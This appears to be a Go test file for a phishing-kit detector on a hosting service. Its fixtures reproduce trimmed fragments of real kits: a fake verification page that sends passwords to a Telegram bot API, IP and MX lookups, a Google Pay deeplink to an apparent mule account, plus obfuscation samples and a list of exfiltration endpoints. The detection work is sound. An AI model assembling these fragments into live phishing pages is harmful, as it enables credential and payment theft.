package abuse

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// scanString runs one file through the default rules.
func scanString(t *testing.T, path, content string) Result {
	t.Helper()
	s := Defaults().NewScan(path)
	if s == nil {
		t.Fatalf("%s is not scanned", path)
	}
	s.Write([]byte(content))
	return s.Result()
}

func hitIDs(r Result) []string {
	var out []string
	for _, h := range r.Hits {
		out = append(out, h.Rule)
	}
	return out
}

func hasHit(r Result, id string) bool {
	for _, h := range r.Hits {
		if h.Rule == id {
			return true
		}
	}
	return false
}

// The shapes of the 2026-09-25 Telegram harvester, reduced to the lines that
// matter. The full kit is held as evidence on the host; these are enough to
// prove each rule fires on what the kit actually contained.
const telegramKit = `<!DOCTYPE html><html><head>
<script type='text/javascript' src='https://ipfs.io/S9bgT2osMdKM9tgxUyy/x.js'></script>
<title>Account Verification</title></head><body>
<form id="verifyForm">
  <input type="text" class="hp-field" id="botcheck" name="botcheck" autocomplete="off">
  <input type="password" id="password" placeholder="Password">
</form>
<script>
fetch('https://api.ipify.org?format=json')
const clearbitUrl = ` + "`https://logo.clearbit.com/${domain}?size=20`" + `;
fetch(` + "`https://dns.google/resolve?name=${domain}&type=MX`" + `)
async function sendToTelegram(email, password, ip, mx) {
  fetch(` + "`https://api.telegram.org/bot${botToken}/sendMessage`" + `, {method: 'POST'})
}
const hash = window.location.hash.substring(1);
function dec() { return atob(hash); }
</script></body></html>`

func TestTelegramKitTripsEveryRuleItCarries(t *testing.T) {
	r := scanString(t, "bug.html", telegramKit)
	for _, id := range []string{
		"telegram-bot-api", "telegram-sender", "botcheck-password",
		"clearbit-logo-password", "dns-lookup-password", "ip-lookup-password",
		"hash-email-password", "brand-login-title", "ipfs-script",
	} {
		if !hasHit(r, id) {
			t.Errorf("rule %s did not fire; hits: %v", id, hitIDs(r))
		}
	}
	if !r.Active || !r.Blocks() {
		t.Errorf("an .html kit must be active and blocking: %+v", r)
	}
	if r.SHA256 == "" {
		t.Error("no content hash")
	}
}

// The UPI payment page of 2026-09-28: a button whose data attribute opens
// Google Pay on a mule account.
const upiKit = `<!DOCTYPE html><html><head><title>Deeplink Tester</title></head><body>
<button id="deeplinkButton" data-deeplink="tez://upi/pay?pa=7479940779-qf03@ybl&pn=Subhash%20Kumar%20Ram&am=500&cu=INR">Pay with Google Pay</button>
<script src="script.js"></script></body></html>`

func TestWalletDeeplinkBlocksAndPlainUPIFlags(t *testing.T) {
	r := scanString(t, "index.html", upiKit)
	if !hasHit(r, "wallet-deeplink") || !r.Blocks() {
		t.Fatalf("the tez:// page must block: %v", hitIDs(r))
	}
	merchant := `<a href="upi://pay?pa=shop@okaxis&pn=Chai%20Corner">Pay with UPI</a>`
	r = scanString(t, "index.html", merchant)
	if !hasHit(r, "upi-deeplink") {
		t.Fatalf("upi:// not flagged: %v", hitIDs(r))
	}
	if r.Blocks() {
		t.Error("a plain upi:// merchant link must only flag")
	}
}

func TestLegitimateLoginFormsDoNotTrip(t *testing.T) {
	for name, content := range map[string]string{
		"plain login": `<html><head><title>Members area</title></head><body>
<form action="/login" method="post"><input name="user"><input type="password" name="pw"><button>Sign in</button></form></body></html>`,
		"spa bundle": `!function(){var e=window.location.hash;function t(n){return atob(n)}` +
			`var r={type:"password",placeholder:"Password"};fetch("/api/login",{method:"POST"})}();`,
		"blog about telegram": `<h1>How I built my Telegram bot</h1><p>Telegram's bot platform is great.</p>`,
		"ip in a status page": `<p>Your IP is shown by our own backend.</p><input type="password">`,
		"microsoft mention":   `<p>We are a Microsoft partner.</p><form><input type="email"></form>`,
		"minified library":    `(function(){var s=String.fromCharCode(72,101,108,108,111);eval("1+1")})()`,
	} {
		path := "index.html"
		if name == "spa bundle" || name == "minified library" {
			path = "assets/app.js"
		}
		r := scanString(t, path, content)
		if len(r.Hits) > 0 {
			t.Errorf("%s: unexpected hits %v", name, hitIDs(r))
		}
	}
}

func TestBlockOnlyInActiveFiles(t *testing.T) {
	r := scanString(t, "notes.txt", "remember: https://api.telegram.org/bot123:abc/sendMessage")
	if !hasHit(r, "telegram-bot-api") {
		t.Fatalf("a .txt is scanned too: %v", hitIDs(r))
	}
	if r.Active || r.Blocks() {
		t.Error("a hit in a .txt must not block")
	}
	r = scanString(t, "x.js", "fetch('https://api.telegram.org/bot1:a/sendMessage')")
	if !r.Active || !r.Blocks() {
		t.Error("a hit in a .js blocks")
	}
}

func TestMarkupOnlyRuleIgnoresScripts(t *testing.T) {
	js := `var h=window.location.hash;atob(h);var f={type:"password"};`
	if r := scanString(t, "app.js", js); hasHit(r, "hash-email-password") {
		t.Error("hash-email-password is limited to markup")
	}
	if r := scanString(t, "a.html", "<script>"+js+"</script>"); !hasHit(r, "hash-email-password") {
		t.Error("hash-email-password must fire in markup")
	}
}

func TestBrandLures(t *testing.T) {
	cases := map[string]string{
		"brand-login-title": `<title>Sign in to your account | Office 365</title><input type="password">`,
		"brand-login-text":  `<h2>Log in</h2><p>Access your OneDrive files</p><input type='password'>`,
		"lure-login-text":   `<p>Sign in to your Microsoft account</p><input type=password>`,
	}
	for id, content := range cases {
		if r := scanString(t, "index.html", content); !hasHit(r, id) || !r.Blocks() {
			t.Errorf("%s: hits %v", id, hitIDs(r))
		}
	}
	// the brand without a password field is not a lure
	if r := scanString(t, "index.html", `<title>Our Office 365 migration service</title>`); len(r.Hits) > 0 {
		t.Errorf("brand alone: %v", hitIDs(r))
	}
}

func TestObfuscationFlags(t *testing.T) {
	nums := strings.Repeat("104,", 45) + "104"
	for id, content := range map[string]string{
		"obfuscation-eval-atob": `eval(atob("YWxlcnQoMSk="))`,
		"obfuscation-charcode":  `String.fromCharCode(` + nums + `)`,
		"obfuscation-unescape":  `document.write(unescape("` + strings.Repeat("%3C", 70) + `"))`,
	} {
		r := scanString(t, "x.js", content)
		if !hasHit(r, id) {
			t.Errorf("%s not flagged: %v", id, hitIDs(r))
		}
		if r.Blocks() {
			t.Errorf("%s must only flag", id)
		}
	}
}

func TestChatWebhooks(t *testing.T) {
	for _, u := range []string{
		"https://discord.com/api/webhooks/1/abc",
		"https://discordapp.com/api/webhooks/1/abc",
		"https://hooks.slack.com/services/T0/B0/x",
	} {
		if r := scanString(t, "a.html", `<script>fetch("`+u+`")</script>`); !hasHit(r, "chat-webhook") {
			t.Errorf("%s: %v", u, hitIDs(r))
		}
	}
}

func TestMatchSpansChunkBoundary(t *testing.T) {
	s := Defaults().NewScan("a.html")
	// the needle straddles the 64 KiB chunk edge, written in two pieces
	pad := bytes.Repeat([]byte(" "), chunkSize-10)
	s.Write(pad)
	s.Write([]byte("xx https://api.telegram.org/bot1:a/sendMessage"))
	if r := s.Result(); !hasHit(r, "telegram-bot-api") {
		t.Fatalf("missed across the chunk edge: %v", hitIDs(r))
	}
}

func TestCombinedRuleAcrossChunks(t *testing.T) {
	s := Defaults().NewScan("a.html")
	s.Write([]byte(`<input type="password">`))
	s.Write(bytes.Repeat([]byte("a"), 3*chunkSize))
	s.Write([]byte(`<img src="https://logo.clearbit.com/x.com">`))
	if r := s.Result(); !hasHit(r, "clearbit-logo-password") {
		t.Fatalf("patterns far apart in one file: %v", hitIDs(r))
	}
}

func TestBinaryAndSkippedFiles(t *testing.T) {
	if Defaults().NewScan("logo.png") != nil {
		t.Error("a .png is not scanned")
	}
	s := Defaults().NewScan("blob.bin.html")
	s.Write([]byte("\x00\x01\x02 https://api.telegram.org/bot1:a"))
	if r := s.Result(); len(r.Hits) > 0 || r.SHA256 != "" {
		t.Errorf("a file with a NUL up front is binary: %+v", r)
	}
}

func TestScanCapStopsMatchingNotHashing(t *testing.T) {
	s := Defaults().NewScan("a.html")
	s.Write(bytes.Repeat([]byte("a"), MaxScanBytes))
	s.Write([]byte("https://api.telegram.org/bot1:a"))
	r := s.Result()
	if len(r.Hits) > 0 {
		t.Error("content past the cap is not matched")
	}
	if r.SHA256 == "" {
		t.Error("the whole file is still hashed")
	}
}

func TestSameBytesSameHash(t *testing.T) {
	a := scanString(t, "a.html", telegramKit)
	b := Defaults().NewScan("other/name.html")
	for _, chunk := range strings.SplitAfter(telegramKit, "\n") {
		b.Write([]byte(chunk))
	}
	if a.SHA256 != b.Result().SHA256 {
		t.Error("the fingerprint must depend on the bytes only")
	}
}

func TestExcerptIsOneCleanLine(t *testing.T) {
	r := scanString(t, "a.html", "<script>\n\n  fetch(`https://api.telegram.org/bot${t}/send`)\n</script>")
	var ex string
	for _, h := range r.Hits {
		if h.Rule == "telegram-bot-api" {
			ex = h.Excerpt
		}
	}
	if !strings.Contains(ex, "api.telegram.org/bot") || strings.ContainsAny(ex, "\n\r\t") || len(ex) > 200 {
		t.Errorf("excerpt %q", ex)
	}
}

func TestDestinations(t *testing.T) {
	rs := Defaults()
	for blocked, want := range map[string]string{
		"https://api.telegram.org/bot8874059130:AAG/sendMessage": "telegram-bot",
		"https://api.telegram.org":                               "telegram-bot", // origin-only reports
		"https://api.ipify.org/?format=json":                     "ipify",
		"https://script.google.com/macros/s/x/exec":              "google-script",
		"https://eu.pipedream.net/x":                             "pipedream",
		"api.emailjs.com":                                        "emailjs",
	} {
		d, ok := rs.Destination(blocked)
		if !ok || d.ID != want {
			t.Errorf("%s: got %+v %v, want %s", blocked, d, ok, want)
		}
	}
	for _, blocked := range []string{
		"https://api.telegram.org.evil.example/bot1",
		"https://script.google.com/a/other",
		"https://cdn.example.com/lib.js",
		"inline", "eval", "",
	} {
		if d, ok := rs.Destination(blocked); ok {
			t.Errorf("%s matched %+v", blocked, d)
		}
	}
}

func TestDestinationScanFindsReference(t *testing.T) {
	d, _ := Defaults().Destination("https://api.telegram.org/bot1/x")
	s := DestinationRules(d).NewScan("a.html")
	s.Write([]byte(telegramKit))
	r := s.Result()
	if len(r.Hits) != 1 || r.Hits[0].Rule != "csp:telegram-bot" || r.Hits[0].Severity != Block {
		t.Fatalf("hits %+v", r.Hits)
	}
	s = DestinationRules(d).NewScan("b.html")
	s.Write([]byte("<p>nothing here</p>"))
	if r := s.Result(); len(r.Hits) != 0 {
		t.Errorf("hits %+v", r.Hits)
	}
}

func TestParseExtendsReplacesAndDisables(t *testing.T) {
	rs, err := Parse([]byte(`{
		"rules": [
			{"id": "custom-kit", "severity": "block", "all": ["evilmarker"]},
			{"id": "upi-deeplink", "severity": "block"},
			{"id": "ipfs-script", "severity": "off"}
		],
		"exfil": [{"id": "formspree", "url": "formspree.io", "action": "alert"},
		          {"id": "mine", "url": "collect.example.net/in"}]
	}`))
	if err != nil {
		t.Fatal(err)
	}
	s := rs.NewScan("a.html")
	s.Write([]byte(`evilmarker <a href="upi://pay?pa=x">x</a> <script src="https://ipfs.io/x.js"></script>`))
	r := s.Result()
	if !hasHit(r, "custom-kit") || !hasHit(r, "upi-deeplink") || hasHit(r, "ipfs-script") {
		t.Fatalf("hits %v", hitIDs(r))
	}
	for _, h := range r.Hits {
		if h.Rule == "upi-deeplink" && h.Severity != Block {
			t.Error("a severity-only entry promotes the built-in rule")
		}
	}
	if !hasHit(scanOf(rs, "b.html", telegramKit), "telegram-bot-api") {
		t.Error("extend keeps the built-ins")
	}
	if d, ok := rs.Destination("https://formspree.io/f/x"); !ok || d.Action != ActionAlert {
		t.Errorf("formspree: %+v", d)
	}
	if d, ok := rs.Destination("https://collect.example.net/in/1"); !ok || d.Action != ActionLock {
		t.Errorf("a new destination defaults to lock: %+v", d)
	}

	rs, err = Parse([]byte(`{"defaults": "replace", "rules": [], "exfil": []}`))
	if err != nil {
		t.Fatal(err)
	}
	if r := scanOf(rs, "a.html", telegramKit); len(r.Hits) != 0 {
		t.Errorf("replace with nothing is the kill switch: %v", hitIDs(r))
	}
	if _, ok := rs.Destination("https://api.telegram.org/bot1"); ok {
		t.Error("replace drops built-in destinations")
	}
}

func scanOf(rs *RuleSet, path, content string) Result {
	s := rs.NewScan(path)
	s.Write([]byte(content))
	return s.Result()
}

func TestParseRefusesBrokenFiles(t *testing.T) {
	for name, body := range map[string]string{
		"not json":         `{`,
		"unknown field":    `{"rulez": []}`,
		"bad severity":     `{"rules": [{"id": "x", "severity": "panic", "all": ["a"]}]}`,
		"no patterns":      `{"rules": [{"id": "brand-new", "severity": "block"}]}`,
		"bad regex":        `{"rules": [{"id": "x", "severity": "flag", "all": ["re:(unclosed"]}]}`,
		"empty pattern":    `{"rules": [{"id": "x", "severity": "flag", "any": [""]}]}`,
		"duplicate id":     `{"rules": [{"id": "x", "severity": "flag", "all": ["a"]}, {"id": "x", "severity": "flag", "all": ["b"]}]}`,
		"bad id":           `{"rules": [{"id": "Has Spaces", "severity": "flag", "all": ["a"]}]}`,
		"bad defaults":     `{"defaults": "merge"}`,
		"bad destination":  `{"exfil": [{"id": "x", "url": "", "action": "lock"}]}`,
		"bad dest action":  `{"exfil": [{"id": "x", "url": "a.example", "action": "nuke"}]}`,
		"unknown dest off": `{"exfil": [{"id": "nope", "action": "off"}]}`,
	} {
		if _, err := Parse([]byte(body)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestLoaderReloadsAndKeepsLastGood(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "abuse-rules.json")
	now := time.Now()
	l := NewLoader(path)
	l.now = func() time.Time { return now }

	if r := scanOf(l.Rules(), "a.html", "evilmarker"); len(r.Hits) != 0 {
		t.Fatal("no file: defaults only")
	}
	write := func(body string, mt time.Time) {
		if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		os.Chtimes(path, mt, mt)
	}
	write(`{"rules": [{"id": "custom", "severity": "block", "all": ["evilmarker"]}]}`, now.Add(time.Minute))
	// within the check interval nothing is re-read
	if r := scanOf(l.Rules(), "a.html", "evilmarker"); len(r.Hits) != 0 {
		t.Error("re-read before the interval")
	}
	now = now.Add(checkInterval + time.Second)
	if r := scanOf(l.Rules(), "a.html", "evilmarker"); !hasHit(r, "custom") {
		t.Fatal("the file was not loaded")
	}

	write(`{"rules": [`, now.Add(2*time.Minute)) // broken
	now = now.Add(checkInterval + time.Second)
	if r := scanOf(l.Rules(), "a.html", "evilmarker"); !hasHit(r, "custom") {
		t.Error("a broken file must keep the last good rules")
	}

	write(`{"rules": [{"id": "other", "severity": "flag", "all": ["newmarker"]}]}`, now.Add(3*time.Minute))
	now = now.Add(checkInterval + time.Second)
	if r := scanOf(l.Rules(), "a.html", "newmarker evilmarker"); !hasHit(r, "other") || hasHit(r, "custom") {
		t.Errorf("fixed file not picked up: %v", hitIDs(r))
	}

	os.Remove(path)
	now = now.Add(checkInterval + time.Second)
	if r := scanOf(l.Rules(), "a.html", "newmarker"); len(r.Hits) != 0 {
		t.Error("a deleted file means the defaults again")
	}
}

func TestDefaultsAreValid(t *testing.T) {
	// The compiled-in set goes through the same validation a file does.
	if _, err := compile(defaultRules, defaultDestinations); err != nil {
		t.Fatal(err)
	}
}

func TestRequiredLiterals(t *testing.T) {
	for expr, want := range map[string]string{
		`type\s*[=:]\s*["']?password\b`:         "password",
		`id\s*=\s*["']?botcheck\b`:              "botcheck",
		`fromcharcode\s*\(\s*(\d+\s*,\s*){40,}`: "fromcharcode",
		`abc`:                                   "abc",
		`(foo|bar)baz`:                          "baz",
		`(foo|bar)`:                             "",
	} {
		if got := string(requiredLiteral(expr)); got != want {
			t.Errorf("%s: %q, want %q", expr, got, want)
		}
	}
}

func BenchmarkScanLargeBundle(b *testing.B) {
	chunk := []byte(`function a(b){return b.map(function(c){return c+1})};var x={type:"text",value:"<div class='x'>"};` + "\n")
	data := bytes.Repeat(chunk, (4<<20)/len(chunk))
	b.SetBytes(int64(len(data)))
	for i := 0; i < b.N; i++ {
		s := Defaults().NewScan("bundle.js")
		s.Write(data)
		s.Result()
	}
}
